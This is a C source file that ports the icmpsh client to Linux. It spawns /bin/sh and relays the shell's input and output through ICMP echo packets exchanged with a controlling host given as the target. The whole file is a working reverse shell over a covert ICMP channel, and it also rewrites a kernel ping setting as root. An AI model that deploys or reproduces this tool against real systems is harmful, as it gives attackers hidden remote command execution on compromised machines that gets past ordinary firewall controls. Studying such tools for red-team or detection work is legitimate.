/*	 GNU/Linux port of the icmpsh https://github.com/inquisb/icmpsh client,
 *	 made using this great example https://stackoverflow.com/questions/8290046/icmp-sockets-linux 
 *	 as a template for handling ICMP from Linux.
 * 	 Put together by ewilded, February 2020.
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *    This program is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *    GNU General Public License for more details.
 *
 *    You should have received a copy of the GNU General Public License
 *    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netdb.h>
#include <fcntl.h>
#include <signal.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

#define ICMP_ECHO_REPLY_SIZE		40
#define ICMP_HEADERS_SIZE			ICMP_ECHO_REPLY_SIZE + 8

#define STATUS_OK					0
#define STATUS_SINGLE				1
#define STATUS_PROCESS_NOT_CREATED	2

#define TRANSFER_SUCCESS			1
#define TRANSFER_FAILURE			0

#define DEFAULT_TIMEOUT			    3
#define DEFAULT_DELAY			    200
#define DEFAULT_MAX_BLANKS	   	    10
#define DEFAULT_MAX_DATA_SIZE	    64
#define SEND_BUFF_SIZE				2*DEFAULT_MAX_DATA_SIZE
#define DEBUG						1

int opt;
pid_t shell_pid;
char *target;
unsigned int delay, timeout_val;
unsigned int ip_addr;

unsigned char *in_buf, *out_buf;
unsigned char *in_buf, *out_buf;

unsigned int in_buf_size, out_buf_size;
int shell_fds[2]; // shell_fds[0] will read from the child process, shell_fds[1] will write to it
int blanks, max_blanks;
int status;
unsigned int max_data_size;
struct hostent *he;
struct in_addr dst;
struct icmphdr icmp_hdr;
struct sockaddr_in addr;
int sequence;
int sock;
int debug;
unsigned char data[SEND_BUFF_SIZE];	

/* 
	So basically an ICMP packet can be almost 65k bytes (MAX IP packet size - headers),
	however in practice we need to stay under the lowest path MTU,
	otherwise we will have to deal with fragmentation.
*/ 

struct timeval timeout;
fd_set read_set;
socklen_t slen;
struct icmphdr rcv_hdr;	

// Based on this: https://stackoverflow.com/questions/3884103/can-popen-make-bidirectional-pipes-like-pipe-fork this
/* Spawn a process from pfunc, returning it's pid. The fds array passed will
 * be filled with two descriptors: fds[0] will read from the child process,
 * and fds[1] will write to it.
 * Similarly, the child process will receive a reading/writing fd set (in
 * that same order) as arguments.
*/
pid_t spawn_shell(int fds[2]) 
{	
	if(debug) printf("[DEBUG] Spawning the shell.\n");

    pid_t pid;
    int pipes[4];

    /* Warning: I'm not handling possible errors in pipe/fork */

    pipe(&pipes[0]); /* Parent read/child write pipe */
    pipe(&pipes[2]); /* Child read/parent write pipe */

    if ((pid = fork()) > 0) 
	{
        /* Parent process */
        fds[0] = pipes[0];
        fds[1] = pipes[3];

        close(pipes[1]);
        close(pipes[2]);
		// make the parent read pipe non-blocking
		int flags = fcntl(fds[0], F_GETFL, 0);
		fcntl(fds[0], F_SETFL, flags | O_NONBLOCK);

        return pid;

    } else {
        close(pipes[0]);
        close(pipes[3]);
		dup2(pipes[2], 0);
		dup2(pipes[1], 1);
		dup2(pipes[1], 2);	
		execve("/bin/sh", 0, 0);
    }

    return -1; /* ? */
}

void usage(char *path)	// READY
{
	printf("%s [options] -t target\n", path);
	printf("options:\n");
	printf("  -t host            host ip address to send ping requests to\n");
	printf("  -r                 send a single test icmp request and then quit\n");
	printf("  -d miliseconds   	 delay between requests in miliseconds (default is %u)\n", DEFAULT_DELAY);
	printf("  -o milliseconds    timeout in milliseconds\n");
	printf("  -h                 this screen\n");
	printf("  -b num             maximal number of blanks (unanswered icmp requests)\n");
    printf("                     before quitting\n");
	printf("  -v				 verbose\n");
	printf("  -s bytes           maximal data buffer size in bytes (default is 64 bytes)\n\n", DEFAULT_MAX_DATA_SIZE);
	printf("In order to improve the speed, lower the delay (-d) between requests or\n");
    printf("increase the size (-s) of the data buffer\n");
}

int transfer_icmp() 
{
	unsigned int nbytes;
	int rc;
	
	memset(in_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE); // recv buffer
	memset(data, 0x00, SEND_BUFF_SIZE);	// outgoing message buffer
	
	icmp_hdr.un.echo.sequence = sequence++;
	
	memcpy(data, &icmp_hdr, sizeof icmp_hdr);
	if(out_buf_size) // if there is any data to be sent, add it here, otherwise we'll just send an empty beacon
	{
		memcpy(data + sizeof icmp_hdr, out_buf, out_buf_size);  
	}

    rc = sendto(sock, data, sizeof icmp_hdr + out_buf_size, 0, (struct sockaddr*)&addr, sizeof addr);
    if (rc <= 0) 
	{
        perror("Sendto");
        return TRANSFER_FAILURE; // break;
    }
    if(debug) puts("Sent ICMP\n");
	
	// now, reading the response
    memset(&read_set, 0, sizeof read_set);
    FD_SET(sock, &read_set);

    //wait for a reply with a timeout
    rc = select(sock + 1, &read_set, NULL, NULL, &timeout);
    if (rc == 0) 
	{
        if(debug) puts("Got no reply\n");
        return TRANSFER_FAILURE; // continue;
    } 
	else if (rc < 0) 
	{
            perror("Select");
            return TRANSFER_FAILURE; // break; // was here originally, replaced with return; as now not in the loop
    }
    //we don't care about the sender address in this example..
    slen = 0;
    rc = recvfrom(sock, data, sizeof data, 0, NULL, &slen);
    if (rc <= 0) 
	{
        perror("recvfrom");
		return TRANSFER_FAILURE;	// we probably want to move this mallow up and just memset it in this function
    } 	// so we don't have to call free everytime before we return;
	else if (rc < sizeof rcv_hdr) 
	{
        if(debug) printf("Error, got short ICMP packet, %d bytes\n", rc);
		return TRANSFER_FAILURE;
    }
    memcpy(&rcv_hdr, data, sizeof rcv_hdr);	
    if (rcv_hdr.type != ICMP_ECHOREPLY) 
	{
		 if(debug) printf("[ERROR] Got ICMP packet with unexpected type 0x%x ?!?\n", rcv_hdr.type);
		 return TRANSFER_FAILURE;
	}
	// so, our response data is at: data+sizeof rcv_hdr,data+sizeof rcv_hdr+(rc-sizeof rcv_hdr)-1
	int received_data_size = rc - sizeof rcv_hdr;
	if(debug) printf("[DEBUG] Received ICMP Reply, id=0x%x, sequence =  0x%x, total bytes: %d, data bytes: %d.\n", icmp_hdr.un.echo.id, icmp_hdr.un.echo.sequence, rc, received_data_size);
	if (received_data_size > max_data_size)  // so, we received more data in a single reply than we expected
	{										   // I guess this should not happen when dealing with a compatible server
		if(debug) printf("[DEBUG] WARNING: received %d bytes of data (more than max_data_size %d), ignoring the extra data!", received_data_size, max_data_size);
		nbytes = max_data_size;
	} 
	else 
	{
		nbytes = received_data_size;
	}
	memcpy(in_buf, data+sizeof rcv_hdr, nbytes);
	in_buf_size = nbytes;
	return TRANSFER_SUCCESS;
}
	
int main(int argc, char **argv)
{
	if(getuid()!=0)
	{
		printf("We need root for the powaaah, unlimited powaaaah!!1");
		return -1;
	}
	// set defaults
	debug=DEBUG;
	target = 0;
	timeout_val = DEFAULT_TIMEOUT;
	delay = DEFAULT_DELAY;
	max_blanks = DEFAULT_MAX_BLANKS;
	max_data_size = DEFAULT_MAX_DATA_SIZE;
	status = STATUS_OK;
	// parse command line options
	for (opt = 1; opt < argc; opt++) {
		if (argv[opt][0] == '-') {
			switch(argv[opt][1]) {
				case 'h':
				    usage(*argv);
					return 0;
				case 't':
					if (opt + 1 < argc) {
						target = argv[opt + 1];
					}
					break;
				case 'd':
					if (opt + 1 < argc) {
						delay = atol(argv[opt + 1]);
					}
					break;
				case 'o':
					if (opt + 1 < argc) {
						timeout_val = atol(argv[opt + 1]);
					}
					break;
				case 'r':
					status = STATUS_SINGLE;
					break;
				case 'b':
					if (opt + 1 < argc) {
						max_blanks = atol(argv[opt + 1]);
					}
					break;
				case 's':
					if (opt + 1 < argc) {
						max_data_size = atol(argv[opt + 1]);
					}
					break;
				case 'v': // verbose
					if(opt +1 < argc ) {
						debug=atol(argv[opt + 1]);
					}
					break;
				default:
					printf("unrecognized option -%c\n", argv[1][0]);
					usage(*argv);
					return -1;
			}
		}
	}

	if (!target) {
		printf("you need to specify a host with -t. Try -h for more options\n");
		return -1;
	}

	if (inet_aton(target, &dst) == 0) {

        perror("inet_aton");
        printf("%s isn't a valid IP address\n", argv[1]);
        return -1;
    }

	// don't spawn a shell if we're only sending a single test request
	if (status != STATUS_SINGLE) {
		shell_pid = spawn_shell(shell_fds);
		if(debug) printf("[DEBUG] SHELL PID: %d, fd[0]: %d, fd[1]: %d.\n", shell_pid, shell_fds[0], shell_fds[1]);
	}
	
	// Allow ourselves using ICMP sockets:
	system("sysctl -w net.ipv4.ping_group_range=\"0 0\"");
	// from the manual:
	/*
	       ping_group_range (two integers; default: see below; since Linux
       2.6.39)
              Range of the group IDs (minimum and maximum group IDs,
              inclusive) that are allowed to create ICMP Echo sockets.  The
              default is "1 0", which means no group is allowed to create
              ICMP Echo sockets.
	*/
	// also, other interesting /proc/sys/net/ipv4/ settings spotted while reading http://man7.org/linux/man-pages/man7/icmp.7.html:
	/*
	        icmp_echoreply_rate (Linux 2.2 to 2.4.9)
              Maximum rate for sending ICMP_ECHOREPLY packets in response to
              ICMP_ECHOREQUEST packets.	<-- we might want to change this e.g. if we want to
			  get better speed, e.g. to implement file transfer capability
			icmp_ratelimit (integer; default: 1000; since Linux 2.4.10)
              Limit the maximum rates for sending ICMP packets whose type
              matches icmp_ratemask (see below) to specific targets.  0 to
              disable any limiting, otherwise the minimum space between
              responses in milliseconds
	*/
	// create the ICMP socket
    sequence = 0;
    sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
    if (sock < 0) 
	{
        perror("socket");
        return -1;
    }

    memset(&addr, 0, sizeof addr);
    addr.sin_family = AF_INET;
    addr.sin_addr = dst;

    memset(&icmp_hdr, 0, sizeof icmp_hdr);
    icmp_hdr.type = ICMP_ECHO;
    icmp_hdr.un.echo.id = 1337; //arbitrary id, we might want to change this/make this random ... because reasons :D

	timeout.tv_sec=timeout_val/1000;
	int miliseconds_left=timeout_val-(timeout.tv_sec*1000);
	timeout.tv_usec=miliseconds_left*1000;
	
	// allocate transfer buffers
	in_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
	out_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
	if (!in_buf || !out_buf) 
	{
		printf("[ERROR] Failed to allocate memory for transfer buffers\n");
		return -1;
	}
	memset(in_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);
	memset(out_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);

	// sending/receiving loop
	blanks = 0;
	do {
		switch(status) {
			case STATUS_SINGLE:
				// reply with a static string
				out_buf_size = sprintf(out_buf, "[TEST] Test1234\n");
				break;
			case STATUS_PROCESS_NOT_CREATED:
				// reply with error message
				out_buf_size = sprintf(out_buf, "[ERROR] Process was not created\n");
				break;
			default:

				memset(out_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);
				out_buf_size = 0;

				if(debug) printf("[DEBUG] Attempting to read from the shell...\n");
				
				int read_status = read(shell_fds[0], out_buf, max_data_size); // we should check on the return value
				if(read_status>0)
				{
					out_buf_size = read_status; // ALL GOOD, the number of bytes read was returned
					if(debug) printf("[DEBUG] Read %d bytes from the process.\n",read_status);
				}
				else if(read_status<0)
				{
					if(errno!=EAGAIN)
					{
						printf("[ERROR] while reading from the process: %d\n",read_status);
						return -1;
					}
					else
					{
						if(debug) printf("[DEBUG] No data was returned from the process.\n");
					}
				}
				else
				{
					if(debug) printf("[DEBUG] Read from shell process: received EOF.\n");
					return -1; // looks like the shell died, exiting 
				}
				break;
		}
		// send request/receive response
		if (transfer_icmp() == TRANSFER_SUCCESS) 
		{
			if (status == STATUS_OK) 
			{
				if(debug) printf("[DEBUG] Transfer to server was successful, here is the response received: %s",in_buf);
				// now, write the response to the shell process input descriptor
				// write data from response back into pipe
				if(in_buf_size>0)	// we do not write to the child process if there's nothing to write
				{
					int write_status = write(shell_fds[1], in_buf, in_buf_size); 
					if(write_status>0)
					{
						if(write_status!=in_buf_size)
						{
							if(debug) printf("Interesting, %d of bytes were written while we tried to write %d...\n",write_status, in_buf_size);
						}
						// all good, number of bytes written
					}
					else
					{
						printf("[ERROR] while writing to the process: %d\n",write_status);
						return -1;
					}
					// we should check on the return value
				}
			}
			blanks = 0;
		} 
		else 
		{
			// no reply received or error occured
			if(debug) printf("[DEBUG] No reply received.\n");
			blanks++;
		}
		// wait between requests
		if(debug) printf("[DEBUG] Sleeping for %d miliseconds.\n",delay);
		usleep(delay*1000); // since the argument is in miliseconds while usleep() takes microseconds, the multiply

	} while (status == STATUS_OK && blanks < max_blanks);

	if (status == STATUS_OK) {
		if(shell_pid>0) kill(shell_pid, SIGKILL); // exit if no reply from the master was received max_blanks time
	}
	// restore the default ping_group_range setting
	system("sysctl -w net.ipv4.ping_group_range=\"1 0\"");
    return 0;
}
